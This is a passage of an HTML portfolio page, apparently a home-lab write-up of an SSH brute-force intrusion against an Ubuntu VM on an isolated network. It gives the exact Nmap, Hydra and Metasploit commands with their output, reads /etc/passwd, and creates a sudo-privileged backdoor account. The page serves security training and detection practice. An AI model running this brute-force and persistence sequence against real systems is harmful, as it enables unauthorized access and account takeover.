@@ -1,0 +1,1377 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
+<title>SSH Brute-Force Attack &amp; Detection Home Lab | forbidden402</title>
+<link rel="icon" type="image/svg+xml" href="/static/favicon.svg">
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700;800&family=IBM+Plex+Mono:wght@400;500;600&display=swap" rel="stylesheet" fetchpriority="high">
+<link rel="stylesheet" href="/static/style.css?v=7.0" fetchpriority="high">
+<link rel="stylesheet" href="/static/case-study.css?v=3.5" fetchpriority="high">
+</head>
+<body>
+
+<!-- CYBER PAGE PRELOADER -->
+<div class="cs-loader-overlay" id="page-loader" aria-hidden="true">
+  <div class="cs-loader-box">
+    <div class="cs-loader-header">
+      <span class="cs-loader-tag">// TELEMETRY FEED · SSH BRUTE-FORCE SOC LAB</span>
+      <span class="cs-loader-status"><span class="status-pulse"></span>INITIALIZING</span>
+    </div>
+    <div class="cs-loader-body">
+      <div class="cs-loader-cmd"><span class="cs-prompt">$</span> load dossier --telemetry ssh-ubuntu-lab</div>
+      <div class="cs-progress-track">
+        <div class="cs-progress-fill" id="loader-progress-bar"></div>
+      </div>
+      <div class="cs-loader-meta">
+        <span class="cs-loader-detail" id="loader-status-text">STATUS: 200 OK · VERIFYING INTEGRITY</span>
+        <span class="cs-loader-pct" id="loader-pct-text">100%</span>
+      </div>
+    </div>
+  </div>
+</div>
+
+<div class="cs-wrap">
+
+  <!-- TOP NAV -->
+  <nav class="cs-nav" aria-label="Breadcrumb navigation">
+    <a href="/#homelabs" class="btn-back">
+      <svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><line x1="19" y1="12" x2="5" y2="12"></line><polyline points="12 19 5 12 12 5"></polyline></svg>
+      cd .. / return to portfolio
+    </a>
+    <span class="cs-nav-tag">// LAB 02 · LINUX INTRUSION &amp; SIEM TRIAGE</span>
+  </nav>
+
+  <!-- HERO -->
+  <header class="cs-hero">
+    <div class="cs-meta-row">
+      <span class="cs-tag">// LINUX ADVERSARY SIMULATION &amp; LOG FORENSICS</span>
+      <span class="proj-status status-completed"><span class="status-pulse"></span>COMPLETED LAB</span>
+    </div>
+    <h1 class="cs-title">SSH Brute-Force Attack &amp; Detection Home Lab</h1>
+    <p class="cs-subtitle">
+      An end-to-end adversary simulation and multi-layered detection exercise: executed an automated SSH brute-force attack against an Ubuntu Server target, established Meterpreter C2 and backdoor root persistence, then investigated the entire incident across Wireshark packet traces, host auth.log forensics, and centralized Splunk threat hunting.
+    </p>
+    <div class="cs-actions">
+      <a class="btn-source" href="https://github.com/forbidden402/soc_ubuntu_home_lab" target="_blank" rel="noopener">
+        <svg class="btn-icon" viewBox="0 0 24 24" fill="currentColor" aria-hidden="true"><path d="M12 .297c-6.63 0-12 5.373-12 12 0 5.303 3.438 9.8 8.205 11.385.6.113.82-.258.82-.577 0-.285-.01-1.04-.015-2.04-3.338.724-4.042-1.61-4.042-1.61-.546-1.385-1.335-1.755-1.335-1.755-1.087-.744.084-.729.084-.729 1.205.084 1.838 1.236 1.838 1.236 1.07 1.835 2.809 1.305 3.495.998.108-.776.417-1.305.76-1.605-2.665-.3-5.466-1.332-5.466-5.93 0-1.31.465-2.38 1.235-3.22-.135-.303-.54-1.523.105-3.176 0 0 1.005-.322 3.3 1.23.96-.267 1.98-.399 3-.405 1.02.006 2.04.138 3 .405 2.28-1.552 3.285-1.23 3.285-1.23.645 1.653.24 2.873.12 3.176.765.84 1.23 1.91 1.23 3.22 0 4.61-2.805 5.625-5.475 5.92.42.36.81 1.096.81 2.22 0 1.606-.015 2.896-.015 3.286 0 .315.21.69.825.57C20.565 22.092 24 17.592 24 12.297c0-6.627-5.373-12-12-12"/></svg>
+        view github repository
+      </a>
+    </div>
+  </header>
+
+  <!-- ATTRIBUTES GRID -->
+  <div class="attr-grid">
+    <div class="attr-item">
+      <span class="attr-label">Target System</span>
+      <span class="attr-value">Ubuntu 26.04.1 LTS / OpenSSH 10.2p1</span>
+    </div>
+    <div class="attr-item">
+      <span class="attr-label">Attacker System</span>
+      <span class="attr-value">Kali Linux (192.168.133.142)</span>
+    </div>
+    <div class="attr-item">
+      <span class="attr-label">SIEM Platform</span>
+      <span class="attr-value">Splunk Enterprise 10.4.3 (Windows 11)</span>
+    </div>
+    <div class="attr-item">
+      <span class="attr-label">Telemetry Ingestion</span>
+      <span class="attr-value">Splunk Universal Forwarder (/var/log/auth.log)</span>
+    </div>
+    <div class="attr-item">
+      <span class="attr-label">Network Packet Analysis</span>
+      <span class="attr-value">Wireshark (ens33 pcapng capture)</span>
+    </div>
+    <div class="attr-item">
+      <span class="attr-label">Attack Toolkit</span>
+      <span class="attr-value">THC-Hydra 9.7, Metasploit, Nmap</span>
+    </div>
+  </div>
+
+  <main class="cs-content">
+
+    <!-- 01 ARCHITECTURE & TOPOLOGY -->
+    <section class="cs-sec">
+      <div class="cs-sec-head">
+        <span class="cs-sec-tag">01</span>
+        <h2>Lab Architecture &amp; Environment Topology</h2>
+      </div>
+      <p>
+        The lab was built on an isolated virtual host-only network segment (<code>192.168.133.0/24</code>) so that the Kali attacker machine could reach the target's SSH port, while the Ubuntu server shipped authentication logs to a Windows-hosted Splunk instance in real time without external risk.
+      </p>
+
+      <!-- VISUAL TOPOLOGY ARCHITECTURE -->
+      <div class="topology-card">
+        <div class="topo-title-bar">
+          <span class="topo-title">
+            <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><rect x="2" y="2" width="20" height="8" rx="2" ry="2"></rect><rect x="2" y="14" width="20" height="8" rx="2" ry="2"></rect><line x1="6" y1="6" x2="6.01" y2="6"></line><line x1="6" y1="18" x2="6.01" y2="18"></line></svg>
+            NETWORK TOPOLOGY &amp; DATA PIPELINE
+          </span>
+          <span class="topo-meta" style="color:var(--muted); font-family:'IBM Plex Mono',monospace; font-size:11px;">192.168.133.0/24 HOST-ONLY</span>
+        </div>
+
+        <div class="topo-flow-row">
+          <!-- Attacker Node -->
+          <div class="topo-node topo-node-att">
+            <div class="topo-role-tag">
+              <span class="status-pulse" style="background:#f87171; box-shadow:0 0 8px #f87171;"></span>
+              ATTACKER (VM)
+            </div>
+            <div class="topo-host">Kali Linux</div>
+            <div class="topo-ip">192.168.133.142</div>
+            <div class="topo-desc">Nmap · THC-Hydra 9.7 · Metasploit msfconsole</div>
+          </div>
+
+          <!-- Attack Arrow -->
+          <div class="topo-arrow-col">
+            <span class="topo-arrow-label">Port 22 · SSH Brute Force</span>
+            <div class="topo-arrow-line">
+              <span class="arrow-horiz">──────➔</span>
+              <span class="arrow-vert" aria-hidden="true">▼</span>
+            </div>
+          </div>
+
+          <!-- Target Node -->
+          <div class="topo-node topo-node-tgt">
+            <div class="topo-role-tag">
+              <span class="status-pulse" style="background:var(--amber); box-shadow:0 0 8px var(--amber);"></span>
+              TARGET (VM)
+            </div>
+            <div class="topo-host">Ubuntu Server 26.04.1</div>
+            <div class="topo-ip">192.168.133.132</div>
+            <div class="topo-desc">OpenSSH 10.2p1 · Splunk Universal Forwarder</div>
+          </div>
+        </div>
+
+        <!-- Vertical Log Forwarding Flow -->
+        <div class="topo-vertical-flow">
+          <span class="topo-vert-label">Forwarding /var/log/auth.log via TCP 9997</span>
+          <span class="topo-vert-arrow">▼</span>
+        </div>
+
+        <!-- SIEM Host Node -->
+        <div class="topo-bottom-row">
+          <div class="topo-node topo-node-siem">
+            <div class="topo-role-tag">
+              <span class="status-pulse" style="background:var(--green); box-shadow:0 0 8px var(--green);"></span>
+              SIEM &amp; DETECTION (HOST)
+            </div>
+            <div class="topo-host">Windows 11 Host</div>
+            <div class="topo-ip">Splunk Enterprise 10.4.3</div>
+            <div class="topo-desc">SPL threat hunting · rex regex extraction · Alert correlation</div>
+          </div>
+        </div>
+      </div>
+
+      <!-- ASCII TERMINAL CANVAS -->
+      <div class="terminal-block ascii-term-block">
+        <div class="terminal-bar">
+          <div class="terminal-dots">
+            <span class="dot dot-red"></span><span class="dot dot-yellow"></span><span class="dot dot-green"></span>
+          </div>
+          <span class="terminal-title">topology: ascii network diagram</span>
+          <span class="terminal-badge terminal-badge-cmd">MONOSPACE CANVAS</span>
+        </div>
+        <pre class="ascii-canvas"><code><span class="ascii-box-att">┌─────────────────────────┐</span>             <span class="ascii-box-tgt">┌─────────────────────────┐</span>
+<span class="ascii-box-att">│   Kali Linux Attacker   │</span>             <span class="ascii-box-tgt">│   Ubuntu Server Target  │</span>
+<span class="ascii-box-att">│     192.168.133.142     │</span>             <span class="ascii-box-tgt">│     192.168.133.132     │</span>
+<span class="ascii-box-att">└────────────┬────────────┘</span>             <span class="ascii-box-tgt">└────────────┬────────────┘</span>
+             │                                       │
+             │─────── <span class="ascii-attack-lbl">Port 22 (SSH Brute Force)</span> ────&gt;│
+             │                                       │ <span class="ascii-fwd-lbl">(Forwarding /var/log/auth.log)</span>
+             │                                       ▼
+             │                          <span class="ascii-box-siem">┌─────────────────────────┐</span>
+             └─────────────────────────&gt;<span class="ascii-box-siem">│     Windows 11 Host     │</span>
+                                        <span class="ascii-box-siem">│ Splunk Enterprise 10.4.3│</span>
+                                        <span class="ascii-box-siem">└─────────────────────────┘</span></code></pre>
+      </div>
+
+      <div class="cs-table-wrap">
+        <table class="cs-table">
+          <thead>
+            <tr>
+              <th>Role</th>
+              <th>Hostname / OS</th>
+              <th>IP Address</th>
+              <th>Environment Details</th>
+            </tr>
+          </thead>
+          <tbody>
+            <tr>
+              <td><strong style="color:var(--amber)">Attacker</strong></td>
+              <td>Kali Linux (VM)</td>
+              <td class="mono">192.168.133.142</td>
+              <td>Tools: Nmap, THC-Hydra 9.7, Metasploit Framework (msfconsole)</td>
+            </tr>
+            <tr>
+              <td><strong style="color:var(--green)">Target</strong></td>
+              <td>Ubuntu Server (VM)</td>
+              <td class="mono">192.168.133.132</td>
+              <td>Ubuntu 26.04.1 LTS (Resolute Raccoon), OpenSSH 10.2p1</td>
+            </tr>
+            <tr>
+              <td><strong style="color:var(--muted)">SIEM / Monitor</strong></td>
+              <td>Windows 11 Host</td>
+              <td class="mono">Host-Only Gateway</td>
+              <td>Splunk Enterprise 10.4.3 receiving forwarded logs via port 9997</td>
+            </tr>
+          </tbody>
+        </table>
+      </div>
+
+      <div class="callout">
+        <div class="callout-title">
+          <svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><circle cx="12" cy="12" r="10"></circle><line x1="12" y1="16" x2="12" y2="12"></line><line x1="12" y1="8" x2="12.01" y2="8"></line></svg>
+          Splunk Universal Forwarder Pipeline
+        </div>
+        <p>
+          Log forwarding was established using the Splunk Universal Forwarder running as the <code>splunkfwd</code> service account on Ubuntu, ingesting <code>/var/log/auth.log</code> directly into <code>index=main host="ubuntu"</code>.
+        </p>
+      </div>
+
+      <p><strong>Tools Used Throughout Investigation:</strong></p>
+      <ul>
+        <li><strong>Reconnaissance &amp; Exploitation:</strong> Nmap, THC-Hydra 9.7, Metasploit Framework (<code>msfconsole</code>).</li>
+        <li><strong>Network Inspection:</strong> Wireshark (<code>pcapng</code> packet analysis on interface <code>ens33</code>).</li>
+        <li><strong>Host Forensics:</strong> Linux CLI utilities (<code>tail -f</code>, <code>grep</code>, <code>lsof</code>, <code>cat</code>).</li>
+        <li><strong>SIEM &amp; Threat Hunting:</strong> Splunk Enterprise 10.4.3 (SPL queries, <code>rex</code> dynamic field extractions).</li>
+      </ul>
+    </section>
+
+    <!-- ========================================================
+         PHASE 01: ATTACK (OFFENSIVE ADVERSARY SIMULATION)
+         ======================================================== -->
+    <div class="phase-banner phase-banner-att">
+      <div class="phase-header">
+        <span class="phase-tag">
+          <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><polygon points="13 2 3 14 12 14 11 22 21 10 12 10 13 2"></polygon></svg>
+          PHASE 01 · OFFENSIVE SIMULATION
+        </span>
+        <span class="phase-role">RED TEAM / ATTACKER</span>
+      </div>
+      <div class="phase-title">Adversary Emulation &amp; Post-Exploitation Lifecycle</div>
+      <div class="phase-desc">
+        Executing an end-to-end cyber attack on an isolated Ubuntu target: reconnaissance scanning, automated SSH dictionary brute-force, interactive session compromise, backdoor account persistence, and Meterpreter C2 escalation.
+      </div>
+      <div class="phase-pipeline">
+        <span class="pipeline-step">01 Recon (Nmap)</span>
+        <span class="pipeline-arrow">➔</span>
+        <span class="pipeline-step">02 Brute-Force (Hydra)</span>
+        <span class="pipeline-arrow">➔</span>
+        <span class="pipeline-step">03 Shell (Metasploit)</span>
+        <span class="pipeline-arrow">➔</span>
+        <span class="pipeline-step">04 Persistence (useradd)</span>
+        <span class="pipeline-arrow">➔</span>
+        <span class="pipeline-step">05 C2 Upgrade (Meterpreter)</span>
+      </div>
+    </div>
+
+    <!-- 02 ATTACKER WALKTHROUGH -->
+    <section class="cs-sec">
+      <div class="cs-sec-head">
+        <span class="cs-sec-tag">02</span>
+        <span class="phase-badge phase-badge-att">ATTACK</span>
+        <h2>Part 1: Adversary Simulation &amp; Exploitation (Kali Linux)</h2>
+      </div>
+      <p>
+        The offensive phase simulated a complete intrusion lifecycle: active service scanning, targeted dictionary brute-forcing, interactive session establishment, backdoor local user creation, sudoers privilege escalation, and upgrading to a Meterpreter C2 channel.
+      </p>
+
+      <!-- Step 1: Nmap -->
+      <h3 style="font-size:16px; margin:24px 0 12px; color:var(--text);">Step 1: Service Fingerprinting with Nmap</h3>
+      <p>I initiated a targeted service scan against port 22 on the target IP (<code>192.168.133.132</code>):</p>
+
+      <div class="terminal-block terminal-cmd-block">
+        <div class="terminal-bar">
+          <div class="terminal-dots">
+            <span class="dot dot-red"></span><span class="dot dot-yellow"></span><span class="dot dot-green"></span>
+          </div>
+          <span class="terminal-title">kali@kali:~$ nmap</span>
+          <span class="terminal-badge terminal-badge-cmd">CLI COMMAND</span>
+        </div>
+        <div class="terminal-code"><span class="terminal-prompt">kali@kali:~$</span><span class="cmd">nmap -sV -p 22 192.168.133.132</span></div>
+      </div>
+
+      <div class="terminal-block terminal-out-block">
+        <div class="terminal-bar">
+          <div class="terminal-dots">
+            <span class="dot dot-red"></span><span class="dot dot-yellow"></span><span class="dot dot-green"></span>
+          </div>
+          <span class="terminal-title">Nmap Service Probe Result</span>
+          <span class="terminal-badge terminal-badge-out">STDOUT</span>
+        </div>
+        <div class="terminal-code">PORT   STATE SERVICE VERSION
+22/tcp open  ssh     <span class="highlight">OpenSSH 10.2p1 Ubuntu 2ubuntu3.6</span> (Ubuntu Linux; protocol 2.0)
+MAC Address: 00:0C:29:FD:07:E2 (VMware)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</div>
+      </div>
+
+      <div class="result-box">
+        <div class="result-box-title">
+          <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><polyline points="20 6 9 17 4 12"></polyline></svg>
+          Step 1 Scan Results &amp; Key Findings
+        </div>
+        <ul>
+          <li><strong>Open Service:</strong> Port 22 was open and actively running <code>OpenSSH 10.2p1</code> (protocol 2.0).</li>
+          <li><strong>Virtualization Indicator:</strong> The MAC OUI (<code>00:0C:29</code>) confirmed the target was a VMware virtual machine.</li>
+        </ul>
+      </div>
+
+      <!-- Step 2: Hydra -->
+      <h3 style="font-size:16px; margin:24px 0 12px; color:var(--text);">Step 2: Credential Brute-Forcing with Hydra</h3>
+      <p>
+        Knowing Ubuntu cloud/server images typically come with default user <code>ubuntu</code>, I tested that username against a targeted password list (<code>password.txt</code>):
+      </p>
+
+      <div class="terminal-block terminal-cmd-block">
+        <div class="terminal-bar">
+          <div class="terminal-dots">
+            <span class="dot dot-red"></span><span class="dot dot-yellow"></span><span class="dot dot-green"></span>
+          </div>
+          <span class="terminal-title">kali@kali:~$ hydra</span>
+          <span class="terminal-badge terminal-badge-cmd">CLI COMMAND</span>
+        </div>
+        <div class="terminal-code"><span class="terminal-prompt">kali@kali:~$</span><span class="cmd">hydra -l ubuntu -P /home/kali/Desktop/password.txt ssh://192.168.133.132</span></div>
+      </div>
+
+      <div class="terminal-block terminal-out-block">
+        <div class="terminal-bar">
+          <div class="terminal-dots">
+            <span class="dot dot-red"></span><span class="dot dot-yellow"></span><span class="dot dot-green"></span>
+          </div>
+          <span class="terminal-title">Hydra Attack Result · Valid Credentials Identified</span>
+          <span class="terminal-badge terminal-badge-out">STDOUT</span>
+        </div>
+        <div class="terminal-code">Hydra v9.7 (c) 2023 by van Hauser/THC &amp; David Maciejak
+[DATA] max 3 tasks per 1 server, overall 3 tasks, 3 login tries (l:1/p:3), ~1 try per task
+[DATA] attacking ssh://192.168.133.132:22/
+[22][ssh] host: 192.168.133.132   login: <span class="highlight">ubuntu</span>   password: <span class="cmd">sudosu</span>
+<span class="highlight">1 of 1 target successfully completed, 1 valid password found</span></div>
+      </div>
+
+      <div class="result-box">
+        <div class="result-box-title">
+          <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><polyline points="20 6 9 17 4 12"></polyline></svg>
+          Step 2 Brute-Force Results
+        </div>
+        <p>
+          Within seconds, Hydra struck gold with valid credentials: <strong><code>ubuntu:sudosu</code></strong> (1 valid password found across 3 dictionary attempts).
+        </p>
+      </div>
+
+      <!-- Step 3: Metasploit -->
+      <h3 style="font-size:16px; margin:24px 0 12px; color:var(--text);">Step 3: Establishing a Controlled Session via Metasploit</h3>
+      <p>
+        Rather than dropping into an ordinary SSH client, I loaded Metasploit's <code>ssh_login</code> auxiliary scanner to verify credentials while managing sessions inside <code>msfconsole</code>:
+      </p>
+
+      <div class="terminal-block terminal-cmd-block">
+        <div class="terminal-bar">
+          <div class="terminal-dots">
+            <span class="dot dot-red"></span><span class="dot dot-yellow"></span><span class="dot dot-green"></span>
+          </div>
+          <span class="terminal-title">msfconsole · auxiliary/scanner/ssh/ssh_login</span>
+          <span class="terminal-badge terminal-badge-cmd">CLI COMMAND</span>
+        </div>
+        <div class="terminal-code"><span class="terminal-prompt">msf6 &gt;</span><span class="cmd">use auxiliary/scanner/ssh/ssh_login</span>
+<span class="terminal-prompt">msf6 auxiliary(scanner/ssh/ssh_login) &gt;</span><span class="cmd">set RHOSTS 192.168.133.132</span>
+<span class="terminal-prompt">msf6 auxiliary(scanner/ssh/ssh_login) &gt;</span><span class="cmd">set USERNAME ubuntu</span>
+<span class="terminal-prompt">msf6 auxiliary(scanner/ssh/ssh_login) &gt;</span><span class="cmd">set PASSWORD sudosu</span>
+<span class="terminal-prompt">msf6 auxiliary(scanner/ssh/ssh_login) &gt;</span><span class="cmd">run</span></div>
+      </div>
+
+      <div class="terminal-block terminal-out-block">
+        <div class="terminal-bar">
+          <div class="terminal-dots">
+            <span class="dot dot-red"></span><span class="dot dot-yellow"></span><span class="dot dot-green"></span>
+          </div>
+          <span class="terminal-title">Metasploit Output · Session 1 Established</span>
+          <span class="terminal-badge terminal-badge-out">STDOUT</span>
+        </div>
+        <div class="terminal-code">[*] 192.168.133.132:22 SSH - Testing User/Pass combinations
+[+] <span class="highlight">Success: 'ubuntu:sudosu'</span> 'uid=1000(ubuntu) gid=1000(ubuntu) groups=1000(ubuntu),4(adm),24(cdrom),<span class="highlight">27(sudo)</span>,30(dip),46(plugdev),100(users),111(lpadmin),114(lxd),115(wireshark) Linux ubuntu 7.0.0-34-generic #34-Ubuntu SMP PREEMPT_DYNAMIC Wed Sep 2 14:29:37 UTC 2026 x86_64 GNU/Linux'
+[*] <span class="highlight">SSH session 1 opened</span> (192.168.133.142:37447 -&gt; 192.168.133.132:22) at ...
+[*] Auxiliary module execution completed</div>
+      </div>
+
+      <!-- Figure 1 -->
+      <figure class="cs-figure">
+        <div class="cs-figure-header">
+          <span class="cs-figure-title">
+            <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><rect x="3" y="3" width="18" height="18" rx="2" ry="2"></rect><circle cx="8.5" cy="8.5" r="1.5"></circle><polyline points="21 15 16 10 5 21"></polyline></svg>
+            EVIDENCE 01 · KALI MSF SESSION INITIALIZATION
+          </span>
+          <span class="cs-figure-meta">kali_msf_session.png</span>
+        </div>
+        <div class="cs-figure-img-wrap">
+          <img src="/static/img/soc-ubuntu/kali_msf_session.png" alt="Hydra attack completion and Metasploit SSH session initialization" loading="lazy">
+        </div>
+        <figcaption class="cs-caption">
+          <strong>Figure 1:</strong> The Hydra attack completion (left terminal) and subsequent Metasploit SSH session initialization (right terminal).
+        </figcaption>
+      </figure>
+
+      <div class="result-box">
+        <div class="result-box-title">
+          <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><polyline points="20 6 9 17 4 12"></polyline></svg>
+          Critical Intel &amp; Session Verification Results
+        </div>
+        <ul>
+          <li><strong>Interactive Access:</strong> Valid interactive shell access was granted as Session 1 on port <code>37447</code>.</li>
+          <li><strong>Direct Privilege Escalation Vector:</strong> The user <code>ubuntu</code> belongs to group 27 (<code>sudo</code>), opening a direct path to root privileges.</li>
+        </ul>
+      </div>
+
+      <!-- Step 4: System Enumeration & Persistence -->
+      <h3 style="font-size:16px; margin:24px 0 12px; color:var(--text);">Step 4: System Enumeration &amp; Persistence</h3>
+      <p>
+        I connected to the active session (<code>sessions -i 1</code>) and ran host discovery commands before establishing local backdoor persistence:
+      </p>
+
+      <!-- 4.1 whoami -->
+      <div class="cli-step-label">
+        <span class="cli-step-num">4.1</span>
+        <span>Inspect Current User Identity</span>
+      </div>
+      <div class="terminal-block terminal-cmd-block">
+        <div class="terminal-bar">
+          <div class="terminal-dots"><span class="dot dot-red"></span><span class="dot dot-yellow"></span><span class="dot dot-green"></span></div>
+          <span class="terminal-title">ubuntu@ubuntu:~$ whoami</span>
+          <span class="terminal-badge terminal-badge-cmd">CLI COMMAND</span>
+        </div>
+        <div class="terminal-code"><span class="terminal-prompt">ubuntu@ubuntu:~$</span><span class="cmd">whoami</span></div>
+      </div>
+      <div class="terminal-block terminal-out-block">
+        <div class="terminal-bar">
+          <div class="terminal-dots"><span class="dot dot-red"></span><span class="dot dot-yellow"></span><span class="dot dot-green"></span></div>
+          <span class="terminal-title">User Identity Result</span>
+          <span class="terminal-badge terminal-badge-out">STDOUT</span>
+        </div>
+        <div class="terminal-code"><span class="highlight">ubuntu</span></div>
+      </div>
+
+      <!-- 4.2 os-release -->
+      <div class="cli-step-label">
+        <span class="cli-step-num">4.2</span>
+        <span>Operating System &amp; Kernel Fingerprinting</span>
+      </div>
+      <div class="terminal-block terminal-cmd-block">
+        <div class="terminal-bar">
+          <div class="terminal-dots"><span class="dot dot-red"></span><span class="dot dot-yellow"></span><span class="dot dot-green"></span></div>
+          <span class="terminal-title">ubuntu@ubuntu:~$ cat /etc/os-release</span>
+          <span class="terminal-badge terminal-badge-cmd">CLI COMMAND</span>
+        </div>
+        <div class="terminal-code"><span class="terminal-prompt">ubuntu@ubuntu:~$</span><span class="cmd">cat /etc/os-release</span></div>
+      </div>
+      <div class="terminal-block terminal-out-block">
+        <div class="terminal-bar">
+          <div class="terminal-dots"><span class="dot dot-red"></span><span class="dot dot-yellow"></span><span class="dot dot-green"></span></div>
+          <span class="terminal-title">Distribution Details</span>
+          <span class="terminal-badge terminal-badge-out">STDOUT</span>
+        </div>
+        <div class="terminal-code">PRETTY_NAME="<span class="highlight">Ubuntu 26.04.1 LTS</span>"
+NAME="Ubuntu"
+VERSION_ID="26.04"
+VERSION="26.04.1 LTS (Resolute Raccoon)"
+VERSION_CODENAME=resolute
+ID=ubuntu
+ID_LIKE=debian</div>
+      </div>
+
+      <!-- 4.3 passwd -->
+      <div class="cli-step-label">
+        <span class="cli-step-num">4.3</span>
+        <span>Local Account Enumeration</span>
+      </div>
+      <div class="terminal-block terminal-cmd-block">
+        <div class="terminal-bar">
+          <div class="terminal-dots"><span class="dot dot-red"></span><span class="dot dot-yellow"></span><span class="dot dot-green"></span></div>
+          <span class="terminal-title">ubuntu@ubuntu:~$ cat /etc/passwd</span>
+          <span class="terminal-badge terminal-badge-cmd">CLI COMMAND</span>
+        </div>
+        <div class="terminal-code"><span class="terminal-prompt">ubuntu@ubuntu:~$</span><span class="cmd">cat /etc/passwd</span></div>
+      </div>
+      <div class="terminal-block terminal-out-block">
+        <div class="terminal-bar">
+          <div class="terminal-dots"><span class="dot dot-red"></span><span class="dot dot-yellow"></span><span class="dot dot-green"></span></div>
+          <span class="terminal-title">Account Enumeration · Target Service Accounts</span>
+          <span class="terminal-badge terminal-badge-out">STDOUT</span>
+        </div>
+        <div class="terminal-code">root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+systemd-resolve:x:101:102:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
+<span class="highlight">ubuntu:x:1000:1000:ubuntu:/home/ubuntu:/bin/bash</span>
+<span class="cmd">splunkfwd:x:998:998::/opt/splunkforwarder:/bin/false</span></div>
+      </div>
+
+      <!-- 4.4 Unprivileged useradd -->
+      <div class="cli-step-label">
+        <span class="cli-step-num">4.4</span>
+        <span>Standard User Creation Attempt (Fails Without Root)</span>
+      </div>
+      <div class="terminal-block terminal-cmd-block">
+        <div class="terminal-bar">
+          <div class="terminal-dots"><span class="dot dot-red"></span><span class="dot dot-yellow"></span><span class="dot dot-green"></span></div>
+          <span class="terminal-title">ubuntu@ubuntu:~$ useradd hacker</span>
+          <span class="terminal-badge terminal-badge-cmd">CLI COMMAND</span>
+        </div>
+        <div class="terminal-code"><span class="terminal-prompt">ubuntu@ubuntu:~$</span><span class="cmd">useradd hacker</span></div>
+      </div>
+      <div class="terminal-block terminal-out-block">
+        <div class="terminal-bar">
+          <div class="terminal-dots"><span class="dot dot-red"></span><span class="dot dot-yellow"></span><span class="dot dot-green"></span></div>
+          <span class="terminal-title">Standard Error · Permission Denied</span>
+          <span class="terminal-badge terminal-badge-err">STDERR</span>
+        </div>
+        <div class="terminal-code"><span class="highlight-err">useradd: Permission denied.</span>
+<span class="highlight-err">useradd: cannot lock /etc/passwd; try again later.</span></div>
+      </div>
+
+      <!-- 4.5 Sudo useradd -->
+      <div class="cli-step-label">
+        <span class="cli-step-num">4.5</span>
+        <span>Privileged Account Creation via Sudo</span>
+      </div>
+      <div class="terminal-block terminal-cmd-block">
+        <div class="terminal-bar">
+          <div class="terminal-dots"><span class="dot dot-red"></span><span class="dot dot-yellow"></span><span class="dot dot-green"></span></div>
+          <span class="terminal-title">ubuntu@ubuntu:~$ sudo useradd hacker</span>
+          <span class="terminal-badge terminal-badge-cmd">CLI COMMAND</span>
+        </div>
+        <div class="terminal-code"><span class="terminal-prompt">ubuntu@ubuntu:~$</span><span class="cmd">sudo useradd hacker</span></div>
+      </div>
+      <div class="terminal-block terminal-out-block">
+        <div class="terminal-bar">
+          <div class="terminal-dots"><span class="dot dot-red"></span><span class="dot dot-yellow"></span><span class="dot dot-green"></span></div>
+          <span class="terminal-title">Sudo PAM Authentication</span>
+          <span class="terminal-badge terminal-badge-out">STDOUT</span>
+        </div>
+        <div class="terminal-code">[sudo: authenticate] Password: <span class="highlight">sudosu</span>
+<span class="comment"># Account 'hacker' created successfully (UID=1002, GID=1002, /home/hacker)</span></div>
+      </div>
+
+      <!-- 4.6 Sudo usermod -->
+      <div class="cli-step-label">
+        <span class="cli-step-num">4.6</span>
+        <span>Privilege Escalation · Adding Backdoor to Sudoers</span>
+      </div>
+      <div class="terminal-block terminal-cmd-block">
+        <div class="terminal-bar">
+          <div class="terminal-dots"><span class="dot dot-red"></span><span class="dot dot-yellow"></span><span class="dot dot-green"></span></div>
+          <span class="terminal-title">ubuntu@ubuntu:~$ sudo usermod -aG sudo hacker</span>
+          <span class="terminal-badge terminal-badge-cmd">CLI COMMAND</span>
+        </div>
+        <div class="terminal-code"><span class="terminal-prompt">ubuntu@ubuntu:~$</span><span class="cmd">sudo usermod -aG sudo hacker</span></div>
+      </div>
+      <div class="terminal-block terminal-out-block">
+        <div class="terminal-bar">
+          <div class="terminal-dots"><span class="dot dot-red"></span><span class="dot dot-yellow"></span><span class="dot dot-green"></span></div>
+          <span class="terminal-title">Execution Status</span>
+          <span class="terminal-badge terminal-badge-out">EXIT 0</span>
+        </div>
+        <div class="terminal-code"><span class="highlight">[+] Exit status: 0 (User 'hacker' successfully added to group 'sudo' and shadow group 'sudo')</span></div>
+      </div>
+
+      <div class="result-box">
+        <div class="result-box-title">
+          <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><polyline points="20 6 9 17 4 12"></polyline></svg>
+          Persistence &amp; Shell TTY Results
+        </div>
+        <p>
+          Backdoor user <code>hacker</code> was successfully provisioned and elevated into the <code>sudo</code> group. Because the raw shell lacked a full interactive TTY, running <code>su - hacker</code> choked on password input prompts. To overcome this limitation and maintain stable control, I upgraded the connection.
+        </p>
+      </div>
+
+      <!-- Step 5: Meterpreter Upgrade -->
